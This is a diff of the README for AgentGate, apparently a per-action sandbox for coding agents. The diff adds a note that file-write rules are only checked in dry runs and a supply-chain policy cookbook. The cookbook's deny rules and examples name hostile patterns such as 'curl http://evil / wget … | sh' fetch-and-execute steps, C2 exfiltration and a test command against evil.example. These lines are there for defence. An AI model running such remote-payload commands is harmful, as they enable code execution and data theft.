@@ -1,5 +1,9 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:1e293b,50:2563eb,100:0ea5e9&height=180&section=header&text=AgentGate&fontColor=ffffff&fontSize=64&fontAlignY=38&desc=A%20runtime%20per-action%20host%20sandbox%20for%20coding%20agents&descColor=cbd5e1&descSize=18&descAlignY=60" alt="AgentGate" />
+  <picture>
+    <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
+    <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
+    <img src="./assets/hero-light.svg" width="880" alt="AgentGate — a runtime per-action host sandbox for coding agents">
+  </picture>
 </p>
 
 <p align="center">
@@ -8,7 +12,7 @@
 
 <p align="center">
   <a href="./LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT" /></a>
-  <a href="https://github.com/SuperMarioYL/agentgate/releases"><img src="https://img.shields.io/badge/release-v0.3.0-2563eb.svg" alt="Release" /></a>
+  <a href="https://github.com/SuperMarioYL/agentgate/releases"><img src="https://img.shields.io/badge/release-v0.6.0-2563eb.svg" alt="Release" /></a>
   <a href="https://github.com/SuperMarioYL/agentgate/actions"><img src="https://img.shields.io/github/actions/workflow/status/SuperMarioYL/agentgate/ci.yml?branch=main&label=CI" alt="CI" /></a>
   <a href="https://go.dev/"><img src="https://img.shields.io/badge/Go-1.24%2B-00ADD8.svg?logo=go&logoColor=white" alt="Go" /></a>
   <img src="https://img.shields.io/badge/platform-Linux%20%7C%20macOS-334155.svg" alt="Platform" />
@@ -115,15 +119,12 @@ rules:
       target_glob: "*install*"
     decision: ask            # surface every install so you see what gets pulled
 
-  # fs_write — confine writes to the project directory
+  # fs_write — CHECK/DRY-RUN-ONLY in this version (not runtime-enforced yet; see the security note below)
   - match:
       action: fs_write
       target_glob: "$PWD/**"
     decision: allow
-    scope: "$PWD"            # writes must stay under the project root
-  - match:
-      action: fs_write
-    decision: deny           # any write outside the project root is denied
+    scope: "$PWD"            # documents the intended write scope for `agentgate check`
 
   # net_egress — allow common registries, gate everything else
   - match:
@@ -136,6 +137,8 @@ rules:
 ```
 
 Glob semantics: `*` matches a single path/host segment (`filepath.Match` semantics), `**` matches across segments (e.g. `$PWD/**`); a `**` pattern with a suffix (e.g. `/proj/**.env`) requires the target to *end* with that suffix and will not match it as a mid-string substring (so `/proj/.env.backup/passwd` is not waved through by `/proj/**.env`). A bare host token with no wildcard matches on a **host boundary** — the whole target, or the host part of a `host:port` target (so `registry.npmjs.org` matches `registry.npmjs.org:443`), but it will **not** wave through look-alike hosts such as `github.com.evil.com` or `evilgithub.com`. A leading-dot token (e.g. `.github.com`) matches the whole subdomain tree (`api.github.com`) but not the bare apex `github.com` itself. `agentgate init` drops a sensible built-in default policy you can edit.
+
+> ⚠️ **Security note — what is actually enforced at runtime (read this).** AgentGate **enforces** two surfaces at runtime: `exec` (the subprocesses an agent spawns, resolved per-action through the PATH shim + broker) and `net_egress` (gated per host through a local HTTP(S) redirect proxy). **`fs_write` is CHECK/DRY-RUN-ONLY in this version**: the policy engine and `agentgate check --action fs_write` resolve write rules, but AgentGate does **not** yet intercept an agent's actual writes at runtime (runtime write interposition — Linux ptrace/eBPF, macOS LD_PRELOAD/sandbox-exec — is on the v0.7.0+ roadmap). Because of that, `agentgate init`'s default policy **no longer** ships a blanket `deny fs_write` catch-all that would imply writes are confined when they aren't. Use `agentgate check` to validate write rules, but do **not** rely on them firing on a live run yet — only `exec` and `net_egress` are runtime-enforced today.
 
 ### Dry-run first: `agentgate check`
 
@@ -197,6 +200,27 @@ An out-of-range index, the default row (`*`), or a no-match prints a clear error
 
 > v0.4.0 fix: `[A]lways` on an exec action used to persist the **verbatim command line** (e.g. `npm install left-pad`) as the rule glob. With no wildcards it only ever re-matched that exact argv, so the next `npm install chalk` re-prompted — `--always` did nothing. AgentGate now derives a re-usable glob from the binary + its first subcommand (`npm install*`), covering later installs of the same kind without over-broadening to a different binary (`pip install …` still asks).
 
+## Supply-chain policy cookbook
+
+Authoring a policy from scratch is easy to get wrong. [`examples/policies/supply-chain.yaml`](./examples/policies/supply-chain.yaml) collects ready-to-use rules for **real supply-chain attack behavior** — each labeled with the attack it stops, and **all glob-correct** (no `|` pseudo-alternation; see below):
+
+| Recipe | Attack it stops |
+| --- | --- |
+| `deny exec *curl*` / `deny exec *wget*` | Post-install scripts running `curl http://evil / wget … | sh` to fetch + run a remote payload (RCE / exfil) |
+| `ask exec *npm install*` / `*pip install*` | Surface every dependency install so you see what's pulled (typosquat / poisoned package) |
+| `deny net_egress` fallthrough + registry allowlist | A payload exfiltrating data to an undeclared host / calling back to C2 |
+| `deny exec *chmod +x*` etc. | A post-install script granting itself execute / dropping an executable |
+
+Copy a recipe into your `policy.yaml`, then confirm with `agentgate check` that it denies the named command:
+
+```bash
+cp examples/policies/supply-chain.yaml policy.yaml     # or paste specific rules into your existing policy
+agentgate check --action exec -- curl http://evil.example
+# decision: deny (matched a rule)
+```
+
+> **Why not a single `*curl*|*sh*` rule?** The glob matcher has **no** `|` alternation — `filepath.Match` treats `|` as a **literal character**. So `*curl*|*sh*` only matches a command containing that exact literal `curl … | … sh` sequence, and silently **misses** both `curl http://evil` (no literal pipe) and `wget … | sh` (no `curl`). The cookbook lists each pattern as its own rule (`*curl*`, `*wget*`); never use `|` as alternation.
+
 ## Configuration
 
 Common `agentgate run` flags:
@@ -236,14 +260,15 @@ An honest read — containers are far more mature at isolation; AgentGate solves
 ## Roadmap
 
 - [x] **m1 — wrap & gate exec**: wrap an agent, intercept each subprocess it spawns, prompt allow/deny with the captured intent.
-- [x] **m2 — scope fs & net**: a `policy.yaml` confines filesystem writes to declared paths and gates egress per host, with a JSONL audit log.
+- [x] **m2 — scope fs & net**: a `policy.yaml` gates egress per host with a JSONL audit log; `fs_write` rules are resolvable via `agentgate check` (**check/dry-run-only** — runtime enforcement is on the v0.7.0+ roadmap below).
 - [x] **m3 — DSL & demo**: the `allow`/`deny`/`ask` DSL + `--always` persistence, an `agentgate init` default policy, a 60s asciinema demo, and the bilingual README.
 - [x] **m4 — author & audit a policy**: `agentgate check` dry-runs any action against the policy, host-boundary egress matching closes the look-alike-host bypass, and `.host` tokens scope rules to a subdomain tree.
 - [x] **m5 — CI & triage**: `agentgate run --enforce` for unattended default-deny (no more blocking on a TTY in CI); `agentgate audit` gains `--decision` / `--action` / `--since` filters and `--json` output; plus two sandbox fixes — a symlink-escape write bypass and a `**` path-glob substring over-match.
 - [x] **m6 — inspect a policy & re-usable always**: `agentgate policy` prints every effective rule (including `--always`-appended ones) in first-match order, with `--explain` for a single action; fixes `[A]lways` on an exec persisting the verbatim command line (which re-prompted on the next same-kind install) — it now derives a re-usable binary+subcommand glob.
 - [x] **m7 — revoke a policy (closing the inspect→edit loop)**: `agentgate policy rm <index>` / `--action --target` revokes a persisted rule from the CLI, so taking back an over-broad `[A]lways` grant is as easy as making it was — no more hand-editing `policy.yaml`.
-- [ ] Drop-in adapters and README safety-section integration for more harnesses (ECC / openfang).
-- [ ] A policy cookbook: ready-to-use policies that catch real supply-chain behavior.
+- [x] **m8 — supply-chain cookbook + security honesty**: ships [`examples/policies/supply-chain.yaml`](./examples/policies/supply-chain.yaml) (ready-to-use recipes for real supply-chain behavior, see [Cookbook](#supply-chain-policy-cookbook)); and fixes four security-truth / fail-open defects — `fs_write` no longer claims runtime enforcement (it's check/dry-run-only), the shim now **fails closed** when the broker is unreachable (no ungated exec), the broken example `*curl*|*sh*` rule is replaced with glob-correct separate rules, and the net proxy now **errors out** on a bind failure instead of silently running the agent with ungated egress.
+- [ ] **Runtime fs_write enforcement (v0.7.0+)**: Linux ptrace/eBPF, macOS LD_PRELOAD/sandbox-exec write interposition — upgrades `fs_write` from check-only to real runtime interception.
+- [ ] Drop-in adapters and README safety-section integration for more harnesses (ECC / openfang, v0.7.0).
 - [ ] Team-shared policies / audit dashboard (a v2+ exploration, not the current thesis).
 
 > After pushing, set GitHub topics: `gh repo edit --add-topic agent --add-topic coding-agent --add-topic security --add-topic sandbox`
